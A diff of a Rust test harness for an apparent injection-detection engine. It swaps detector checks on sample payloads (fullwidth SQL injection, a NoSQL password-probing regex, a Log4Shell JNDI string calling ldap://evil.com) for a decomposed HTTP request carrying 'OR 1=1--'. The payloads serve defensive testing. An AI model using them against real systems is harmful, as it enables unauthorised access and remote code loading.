@@ -1,7 +1,14 @@
-use invariant_engine::engine::InvariantEngine;
+use invariant_engine::request_decomposer::{RawHttpRequest, decompose_request};
 fn main() {
-    let engine = InvariantEngine::new();
-    println!("SQL fullwidth: {:?}", engine.detect_deep("ＯＲ 1=1--", None).matches.iter().map(|m| m.class).collect::<Vec<_>>());
-    println!("NoSQL: {:?}", engine.detect_deep("{\"\": \"this.password.match(/^a/)\"}", None).matches.iter().map(|m| m.class).collect::<Vec<_>>());
-    println!("Log4Shell: {:?}", engine.detect_deep("${\\ndi:ldap://evil.com/a}", None).matches.iter().map(|m| m.class).collect::<Vec<_>>());
+    let mut req = RawHttpRequest {
+        method: "GET".into(),
+        path: "/search?q=' OR 1=1--".into(),
+        query_string: None,
+        headers: Default::default(),
+        cookies: None,
+        body: None,
+        content_type: None,
+    };
+    let surfaces = decompose_request(&req);
+    println!("{:#?}", surfaces);
 }
